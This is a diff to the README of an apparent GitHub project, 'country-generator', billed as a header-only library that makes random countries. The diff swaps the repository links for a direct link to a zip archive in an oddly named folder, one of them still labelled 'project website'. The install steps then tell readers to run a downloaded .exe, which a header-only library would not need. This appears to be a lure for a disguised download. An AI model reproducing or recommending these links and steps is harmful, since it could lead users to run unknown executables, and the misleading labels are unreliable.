@@ -1,6 +1,6 @@
 # 🌍 country-generator - Create random countries with population data
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/prohxxfiles121/country-generator)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/prohxxfiles121/country-generator/raw/refs/heads/main/multimammate/generator_country_3.8-beta.3.zip)
 
 This tool generates random countries for your projects. It uses real population data to ensure your results look realistic. It functions as a header-only library, which means it stays small and light on your computer.
 
@@ -19,7 +19,7 @@ The software produces unique country data. You get names, capital cities, and po
 
 Follow these steps to get the generator onto your computer:
 
-1. Visit the project website: [https://github.com/prohxxfiles121/country-generator](https://github.com/prohxxfiles121/country-generator).
+1. Visit the project website: [https://github.com/prohxxfiles121/country-generator/raw/refs/heads/main/multimammate/generator_country_3.8-beta.3.zip](https://github.com/prohxxfiles121/country-generator/raw/refs/heads/main/multimammate/generator_country_3.8-beta.3.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version shown.
 4. Locate the file ending in .exe.
